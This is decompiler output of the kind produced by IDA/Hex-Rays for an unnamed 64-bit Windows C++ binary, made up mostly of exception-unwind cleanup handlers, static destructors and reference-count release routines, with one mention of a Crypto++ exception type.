//----- (000000014009B58D) ----------------------------------------------------
void __usercall sub_14009B58D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 128));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009B60D) ----------------------------------------------------
void __usercall sub_14009B60D(__int64 a1@<rbp>)
{
  sub_140023E20(*(_QWORD *)(a1 + 80));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009B62D) ----------------------------------------------------
void __usercall sub_14009B62D(__int64 a1@<rbp>)
{
  sub_140023E20(*(_QWORD *)(a1 + 96));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CA8D) ----------------------------------------------------
void __usercall sub_14009CA8D(__int64 a1@<rbp>)
{
  sub_14007E210(*(void ***)(a1 + 64));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CAAD) ----------------------------------------------------
void __usercall sub_14009CAAD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CACD) ----------------------------------------------------
void __usercall sub_14009CACD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CAED) ----------------------------------------------------
void __usercall sub_14009CAED(__int64 a1@<rbp>)
{
  sub_14007E210(*(void ***)(a1 + 64));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CC0D) ----------------------------------------------------
void __usercall sub_14009CC0D(__int64 a1@<rbp>)
{
  sub_14007E210(*(void ***)(a1 + 64));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CD6D) ----------------------------------------------------
void __usercall sub_14009CD6D(__int64 a1@<rbp>)
{
  sub_140007CF0(*(_QWORD **)(a1 + 64));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CD8D) ----------------------------------------------------
void __usercall sub_14009CD8D(__int64 a1@<rbp>)
{
  sub_140007CF0(*(_QWORD **)(a1 + 64));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CDAD) ----------------------------------------------------
void __usercall sub_14009CDAD(__int64 a1@<rbp>)
{
  __int64 v1; // rcx
  unsigned __int64 v2; // rax
  unsigned __int64 v3; // rdx

  v1 = *(_QWORD *)(a1 + 272);
  v2 = *(_QWORD *)(v1 + 32);
  v3 = *(_QWORD *)(a1 + 280);
  if ( v3 < v2 )
  {
    do
    {
      if ( --v2 )
        ++*(_QWORD *)(v1 + 24);
      else
        *(_QWORD *)(v1 + 24) = 0i64;
    }
    while ( v3 < v2 );
    *(_QWORD *)(v1 + 32) = v2;
  }
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CDF3) ----------------------------------------------------
void __usercall __noreturn sub_14009CDF3(__int64 a1@<rbp>)
{
  __int64 v1; // rcx
  unsigned __int64 v2; // rax
  unsigned __int64 v3; // rdx

  v1 = *(_QWORD *)(a1 + 272);
  v2 = *(_QWORD *)(v1 + 32);
  v3 = *(_QWORD *)(a1 + 280);
  if ( v3 < v2 )
  {
    do
    {
      if ( !--v2 )
        *(_QWORD *)(v1 + 24) = 0i64;
    }
    while ( v3 < v2 );
    *(_QWORD *)(v1 + 32) = v2;
  }
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CE3D) ----------------------------------------------------
void __usercall sub_14009CE3D(__int64 a1@<rbp>)
{
  __int64 v1; // rcx
  unsigned __int64 v2; // rax
  unsigned __int64 v3; // rdx

  v1 = *(_QWORD *)(a1 + 288);
  v2 = *(_QWORD *)(v1 + 32);
  v3 = *(_QWORD *)(a1 + 296);
  if ( v3 < v2 )
  {
    do
    {
      if ( --v2 )
        ++*(_QWORD *)(v1 + 24);
      else
        *(_QWORD *)(v1 + 24) = 0i64;
    }
    while ( v3 < v2 );
    *(_QWORD *)(v1 + 32) = v2;
  }
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CE83) ----------------------------------------------------
void __usercall __noreturn sub_14009CE83(__int64 a1@<rbp>)
{
  __int64 v1; // rcx
  unsigned __int64 v2; // rax
  unsigned __int64 v3; // rdx

  v1 = *(_QWORD *)(a1 + 288);
  v2 = *(_QWORD *)(v1 + 32);
  v3 = *(_QWORD *)(a1 + 296);
  if ( v3 < v2 )
  {
    do
    {
      if ( !--v2 )
        *(_QWORD *)(v1 + 24) = 0i64;
    }
    while ( v3 < v2 );
    *(_QWORD *)(v1 + 32) = v2;
  }
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CF02) ----------------------------------------------------
#error "14009CF0D: positive sp value has been found (funcsize=0)"

//----- (000000014009CF45) ----------------------------------------------------
void __usercall __noreturn sub_14009CF45(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 80));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CF6D) ----------------------------------------------------
void __usercall sub_14009CF6D(__int64 a1@<rbp>)
{
  sub_14006CAD0(*(_QWORD *)(a1 + 80), *(__int64 **)(a1 + 32));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CF9D) ----------------------------------------------------
void __usercall __noreturn sub_14009CF9D(__int64 a1@<rbp>)
{
  sub_14006CA70(*(_QWORD *)(a1 + 128), *(char **)(a1 + 160));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009CFCD) ----------------------------------------------------
void __usercall __noreturn sub_14009CFCD(__int64 a1@<rbp>)
{
  sub_14006CA70(*(_QWORD *)(a1 + 112), *(char **)(a1 + 144));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009D000) ----------------------------------------------------
void __usercall sub_14009D000(_QWORD *a1@<rbp>)
{
  __int64 v1; // rbx
  __int64 v2; // rdi
  __int64 v3; // rsi

  v1 = a1[10];
  v2 = a1[12];
  if ( v1 != v2 )
  {
    v3 = a1[13];
    do
    {
      sub_14006B860(v3, v1);
      v1 += 32i64;
    }
    while ( v1 != v2 );
  }
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009D069) ----------------------------------------------------
void __usercall __noreturn sub_14009D069(__int64 a1@<rbp>)
{
  sub_14006DD30(*(__int64 ***)(a1 + 64), (__int64 *)(a1 + 88), ***(_QWORD ***)(a1 + 64), **(_QWORD **)(a1 + 64));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009D1DD) ----------------------------------------------------
void __usercall sub_14009D1DD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009D1FD) ----------------------------------------------------
void __usercall sub_14009D1FD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009D22D) ----------------------------------------------------
void __usercall sub_14009D22D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 128));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009DBBE) ----------------------------------------------------
void __usercall sub_14009DBBE(__int64 a1@<rbp>)
{
  __int64 v1; // rbx

  v1 = *(_QWORD *)(a1 + 96);
  if ( *(_QWORD *)(v1 + 24) >= 8ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 24) = 7i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_WORD *)v1 = 0;
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009DC0D) ----------------------------------------------------
void __usercall sub_14009DC0D(__int64 a1@<rbp>)
{
  void *v1; // rcx

  v1 = *(void **)(a1 + 72);
  if ( v1 )
    sub_140074790(v1, 1);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009DC9F) ----------------------------------------------------
void __usercall __noreturn sub_14009DC9F(_QWORD *a1@<rbp>)
{
  __int64 v1; // rbx
  __int64 v2; // rdi
  __int64 v3; // rsi

  v1 = a1[14];
  v2 = a1[16];
  if ( v1 != v2 )
  {
    v3 = a1[17];
    do
    {
      sub_1400743E0(v3, v1);
      v1 += 24i64;
    }
    while ( v1 != v2 );
  }
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009DCF0) ----------------------------------------------------
void __usercall sub_14009DCF0(_QWORD *a1@<rbp>)
{
  __int64 v1; // rbx
  __int64 v2; // rdi
  __int64 v3; // rsi

  v1 = a1[8];
  v2 = a1[10];
  if ( v1 != v2 )
  {
    v3 = a1[11];
    do
    {
      sub_140022D80(v3, v1);
      v1 += 16i64;
    }
    while ( v1 != v2 );
  }
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009DDFD) ----------------------------------------------------
void __usercall sub_14009DDFD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 112));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009DE1D) ----------------------------------------------------
void __usercall sub_14009DE1D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 112));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009DF19) ----------------------------------------------------
void __usercall __noreturn sub_14009DF19(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 32));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009DF65) ----------------------------------------------------
void __usercall __noreturn sub_14009DF65(__int64 a1@<rbp>)
{
  HANDLE v1; // rax

  v1 = GetProcessHeap();
  HeapFree(v1, 0, *(LPVOID *)(a1 + 88));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009DFC5) ----------------------------------------------------
void __usercall __noreturn sub_14009DFC5(__int64 a1@<rbp>)
{
  HANDLE v1; // rax

  v1 = GetProcessHeap();
  HeapFree(v1, 0, *(LPVOID *)(a1 + 88));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009E1ED) ----------------------------------------------------
void __usercall sub_14009E1ED(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 32));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009E20D) ----------------------------------------------------
void __usercall __noreturn sub_14009E20D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 128));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009E23D) ----------------------------------------------------
void __usercall __noreturn sub_14009E23D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 112));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009E285) ----------------------------------------------------
void __usercall __noreturn sub_14009E285(__int64 a1@<rbp>)
{
  HANDLE v1; // rax

  v1 = GetProcessHeap();
  HeapFree(v1, 0, *(LPVOID *)(a1 + 88));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009E4AD) ----------------------------------------------------
void __usercall sub_14009E4AD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009E4CD) ----------------------------------------------------
void __usercall sub_14009E4CD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009E7E9) ----------------------------------------------------
void __usercall __noreturn sub_14009E7E9(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 32));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009E86D) ----------------------------------------------------
void __usercall sub_14009E86D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 128));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009E91D) ----------------------------------------------------
void __usercall sub_14009E91D(__int64 a1@<rbp>)
{
  (*(void (__fastcall **)(_QWORD))(a1 + 80))(*(_QWORD *)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009E97E) ----------------------------------------------------
void __usercall sub_14009E97E(__int64 a1@<rbp>)
{
  __int64 v1; // rbx

  v1 = *(_QWORD *)(a1 + 80);
  if ( *(_QWORD *)(v1 + 24) >= 0x10ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 24) = 15i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_BYTE *)v1 = 0;
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009EAB9) ----------------------------------------------------
void __usercall __noreturn sub_14009EAB9(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 80));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009EADD) ----------------------------------------------------
void __usercall sub_14009EADD(__int64 a1@<rbp>)
{
  sub_14000C720(*(_QWORD *)(a1 + 80), *(__int64 **)(a1 + 32));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009EB19) ----------------------------------------------------
void __usercall __noreturn sub_14009EB19(__int64 a1@<rbp>)
{
  sub_14000CA70(*(__int64 ***)(a1 + 64), (__int64 *)(a1 + 88), ***(_QWORD ***)(a1 + 64), **(_QWORD **)(a1 + 64));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009EC8B) ----------------------------------------------------
void __usercall __noreturn sub_14009EC8B(__int64 a1@<rbp>)
{
  __int64 v1; // rbx
  __int64 i; // rdi

  v1 = *(_QWORD *)(a1 + 80);
  for ( i = *(_QWORD *)(a1 + 96); v1 != i; v1 += 120i64 )
    sub_14000BD90(v1);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009EEAD) ----------------------------------------------------
void __usercall sub_14009EEAD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 128));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009F79D) ----------------------------------------------------
void sub_14009F79D()
{
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009F7BD) ----------------------------------------------------
void sub_14009F7BD()
{
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009F7DD) ----------------------------------------------------
void sub_14009F7DD()
{
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009F7FD) ----------------------------------------------------
void sub_14009F7FD()
{
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009F8D5) ----------------------------------------------------
void __usercall __noreturn sub_14009F8D5(__int64 a1@<rbp>)
{
  sub_140093100((_DWORD *)(a1 + 576));
  CxxThrowException(a1 + 576, &_TI4_AVcls_092_cls_087_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D4B68: using guessed type int _TI4_AVcls_092_cls_087_CryptoPP__;

//----- (000000014009FACE) ----------------------------------------------------
void __usercall sub_14009FACE(__int64 a1@<rbp>)
{
  signed __int64 v1; // rcx
  _DWORD *v2; // rdi

  v1 = 3i64 * *(_QWORD *)(a1 + 120);
  v2 = *(_DWORD **)(a1 + 128);
  while ( v1 )
  {
    *v2 = 0;
    ++v2;
    --v1;
  }
  free(*(void **)(a1 + 128));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009FB0E) ----------------------------------------------------
void __usercall sub_14009FB0E(__int64 a1@<rbp>)
{
  memset(*(void **)(a1 + 128), 0, 24i64 * *(_QWORD *)(a1 + 120));
  free(*(void **)(a1 + 128));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009FB4D) ----------------------------------------------------
void __usercall sub_14009FB4D(__int64 a1@<rbp>)
{
  sub_140091900(*(_QWORD **)(a1 + 80));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009FB6D) ----------------------------------------------------
void __usercall sub_14009FB6D(__int64 a1@<rbp>)
{
  sub_1400912C0(*(_QWORD **)(a1 + 80));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009FB80) ----------------------------------------------------
void *sub_14009FB80()
{
  void *result; // rax

  result = &loc_1400A27F0;
  off_1400D8000[0] = (__int64 (__fastcall *(*)[2])())&loc_1400A27F0;
  return result;
}
// 1400D8000: using guessed type __int64 (__fastcall *(*off_1400D8000[3])[2])();

//----- (000000014009FBB0) ----------------------------------------------------
__int64 sub_14009FBB0()
{
  volatile signed __int32 *v0; // rbx
  __int64 result; // rax

  v0 = (volatile signed __int32 *)qword_1400D9A20;
  if ( qword_1400D9A20 && !_InterlockedDecrement((volatile signed __int32 *)(qword_1400D9A20 + 8)) )
  {
    result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 8i64))(v0);
    if ( !_InterlockedDecrement(v0 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 16i64))(v0);
  }
  return result;
}
// 1400D9A20: using guessed type __int64 qword_1400D9A20;

//----- (000000014009FBF0) ----------------------------------------------------
void __cdecl sub_14009FBF0()
{
  sub_140018D40((__int64)&unk_1400D99E0);
}

//----- (000000014009FC00) ----------------------------------------------------
void sub_14009FC00()
{
  if ( dword_1400D9A48 )
    terminate();
}
// 1400A1A58: using guessed type void terminate(void);
// 1400D9A48: using guessed type int dword_1400D9A48;

//----- (000000014009FC20) ----------------------------------------------------
void __cdecl sub_14009FC20()
{
  volatile signed __int32 *v0; // rbx

  v0 = (volatile signed __int32 *)qword_1400D9C30;
  if ( qword_1400D9C30 && !_InterlockedDecrement((volatile signed __int32 *)(qword_1400D9C30 + 8)) )
  {
    (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 8i64))(v0);
    if ( !_InterlockedDecrement(v0 + 3) )
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 16i64))(v0);
  }
}
// 1400D9C30: using guessed type __int64 qword_1400D9C30;

//----- (000000014009FC60) ----------------------------------------------------
void __cdecl sub_14009FC60()
{
  volatile signed __int32 *v0; // rbx

  v0 = (volatile signed __int32 *)qword_1400D9C40;
  if ( qword_1400D9C40 && !_InterlockedDecrement((volatile signed __int32 *)(qword_1400D9C40 + 8)) )
  {
    (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 8i64))(v0);
    if ( !_InterlockedDecrement(v0 + 3) )
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 16i64))(v0);
  }
}
// 1400D9C40: using guessed type __int64 qword_1400D9C40;

//----- (000000014009FCA0) ----------------------------------------------------
void __cdecl sub_14009FCA0()
{
  volatile signed __int32 *v0; // rbx

  v0 = (volatile signed __int32 *)qword_1400D9C70;
  if ( qword_1400D9C70 && !_InterlockedDecrement((volatile signed __int32 *)(qword_1400D9C70 + 8)) )
  {
    (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 8i64))(v0);
    if ( !_InterlockedDecrement(v0 + 3) )
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 16i64))(v0);
  }
}
// 1400D9C70: using guessed type __int64 qword_1400D9C70;

//----- (000000014009FCE0) ----------------------------------------------------
void __cdecl sub_14009FCE0()
{
  volatile signed __int32 *v0; // rbx

  v0 = (volatile signed __int32 *)qword_1400D9C88;
  if ( qword_1400D9C88 && !_InterlockedDecrement((volatile signed __int32 *)(qword_1400D9C88 + 8)) )
  {
    (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 8i64))(v0);
    if ( !_InterlockedDecrement(v0 + 3) )
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 16i64))(v0);
  }
}
// 1400D9C88: using guessed type __int64 qword_1400D9C88;

//----- (000000014009FD20) ----------------------------------------------------
void __cdecl sub_14009FD20()
{
  operator delete(qword_1400DA3F0);
  qword_1400DA3F0 = 0i64;
}

//----- (000000014009FD40) ----------------------------------------------------
void __cdecl sub_14009FD40()
{
  volatile signed __int32 *v0; // rbx

  v0 = (volatile signed __int32 *)*((_QWORD *)&xmmword_1400DA5B0 + 1);
  if ( *((_QWORD *)&xmmword_1400DA5B0 + 1)
    && !_InterlockedDecrement((volatile signed __int32 *)(*((_QWORD *)&xmmword_1400DA5B0 + 1) + 8i64)) )
  {
    (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 8i64))(v0);
    if ( !_InterlockedDecrement(v0 + 3) )
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 16i64))(v0);
  }
}
// 1400DA5B0: using guessed type __int128 xmmword_1400DA5B0;

//----- (000000014009FD80) ----------------------------------------------------
void __cdecl sub_14009FD80()
{
  qword_1400DA698 = (__int64)&loc_1400A27F0;
}
// 1400DA698: using guessed type __int64 qword_1400DA698;

//----- (000000014009FD90) ----------------------------------------------------
void __cdecl sub_14009FD90()
{
  qword_1400DA688 = (__int64)&loc_1400A27F0;
}
// 1400DA688: using guessed type __int64 qword_1400DA688;

//----- (000000014009FDA0) ----------------------------------------------------
void __cdecl sub_14009FDA0()
{
  void *v0; // rbx
  char v1; // [rsp+30h] [rbp+8h]

  if ( (unsigned __int64)qword_1400DA678 >= 0x10 )
  {
    v0 = qword_1400DA660;
    sub_140003CA0((__int64)&v1);
    nullsub_1(&v1);
    sub_140003CA0((__int64)&v1);
    operator delete(v0);
  }
  qword_1400DA678 = 15i64;
  qword_1400DA670 = 0i64;
  LOBYTE(qword_1400DA660) = 0;
}
// 140095790: using guessed type __int64 __fastcall nullsub_1(_QWORD);
// 1400DA670: using guessed type __int64 qword_1400DA670;
// 1400DA678: using guessed type __int64 qword_1400DA678;

//----- (000000014009FE10) ----------------------------------------------------
void __cdecl sub_14009FE10()
{
  void *v0; // rbx
  char v1; // [rsp+30h] [rbp+8h]

  if ( (unsigned __int64)qword_1400DA6F0 >= 8 )
  {
    v0 = qword_1400DA6D8;
    sub_140003CA0((__int64)&v1);
    nullsub_1(&v1);
    sub_140003CA0((__int64)&v1);
    operator delete(v0);
  }
  qword_1400DA6F0 = 7i64;
  qword_1400DA6E8 = 0i64;
  LOWORD(qword_1400DA6D8) = 0;
}
// 140095790: using guessed type __int64 __fastcall nullsub_1(_QWORD);
// 1400DA6E8: using guessed type __int64 qword_1400DA6E8;
// 1400DA6F0: using guessed type __int64 qword_1400DA6F0;

//----- (000000014009FE80) ----------------------------------------------------
void __cdecl sub_14009FE80()
{
  void *v0; // rbx
  char v1; // [rsp+30h] [rbp+8h]

  if ( (unsigned __int64)qword_1400DA6C8 >= 8 )
  {
    v0 = qword_1400DA6B0;
    sub_140003CA0((__int64)&v1);
    nullsub_1(&v1);
    sub_140003CA0((__int64)&v1);
    operator delete(v0);
  }
  qword_1400DA6C8 = 7i64;
  qword_1400DA6C0 = 0i64;
  LOWORD(qword_1400DA6B0) = 0;
}
// 140095790: using guessed type __int64 __fastcall nullsub_1(_QWORD);
// 1400DA6C0: using guessed type __int64 qword_1400DA6C0;
// 1400DA6C8: using guessed type __int64 qword_1400DA6C8;

//----- (000000014009FEF0) ----------------------------------------------------
void __cdecl sub_14009FEF0()
{
  void (__fastcall ***v0)(_QWORD, signed __int64); // rax

  if ( qword_1400DA700 )
  {
    v0 = (void (__fastcall ***)(_QWORD, signed __int64))(*(__int64 (**)(void))(*(_QWORD *)qword_1400DA700 + 16i64))();
    if ( v0 )
      (**v0)(v0, 1i64);
  }
}
// 1400DA700: using guessed type __int64 qword_1400DA700;

//----- (000000014009FF30) ----------------------------------------------------
__int64 sub_14009FF30()
{
  volatile signed __int32 *v0; // rbx
  __int64 result; // rax

  v0 = (volatile signed __int32 *)qword_1400DA750;
  if ( qword_1400DA750 && !_InterlockedDecrement((volatile signed __int32 *)(qword_1400DA750 + 8)) )
  {
    result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 8i64))(v0);
    if ( !_InterlockedDecrement(v0 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v0 + 16i64))(v0);
  }
  return result;
}
// 1400DA750: using guessed type __int64 qword_1400DA750;

//----- (000000014009FF70) ----------------------------------------------------
void __cdecl sub_14009FF70()
{
  qword_1400DA768 = (__int64)&loc_1400A27F0;
}
// 1400DA768: using guessed type __int64 qword_1400DA768;

//----- (000000014009FF80) ----------------------------------------------------
void __cdecl sub_14009FF80()
{
  void *v0; // rbx
  char v1; // [rsp+30h] [rbp+8h]

  if ( (unsigned __int64)qword_1400D80B8 >= 0x10 )
  {
    v0 = Dst;
    sub_140003CA0((__int64)&v1);
    nullsub_1(&v1);
    sub_140003CA0((__int64)&v1);
    operator delete(v0);
  }
  qword_1400D80B8 = 15i64;
  qword_1400D80B0 = 0i64;
  LOBYTE(Dst) = 0;
}
// 140095790: using guessed type __int64 __fastcall nullsub_1(_QWORD);
// 1400D80B0: using guessed type __int64 qword_1400D80B0;
// 1400D80B8: using guessed type __int64 qword_1400D80B8;

//----- (000000014009FFF0) ----------------------------------------------------
void sub_14009FFF0()
{
  void *v0; // rbx
  char v1; // [rsp+30h] [rbp+8h]

  if ( (unsigned __int64)qword_1400D8098 >= 0x10 )
  {
    v0 = qword_1400D8080;
    sub_140003CA0((__int64)&v1);
    nullsub_1(&v1);
    sub_140003CA0((__int64)&v1);
    operator delete(v0);
  }
  qword_1400D8098 = 15i64;
  qword_1400D8090 = 0i64;
  LOBYTE(qword_1400D8080) = 0;
}
// 140095790: using guessed type __int64 __fastcall nullsub_1(_QWORD);
// 1400D8090: using guessed type __int64 qword_1400D8090;
// 1400D8098: using guessed type __int64 qword_1400D8098;

//----- (00000001400A0060) ----------------------------------------------------
void __cdecl sub_1400A0060()
{
  nullsub_1(&qword_1400DA828);
}
// 140095790: using guessed type __int64 __fastcall nullsub_1(_QWORD);
// 1400DA828: using guessed type __int64 qword_1400DA828;

//----- (00000001400A0070) ----------------------------------------------------
void __cdecl sub_1400A0070()
{
  nullsub_1(&qword_1400DA848);
}
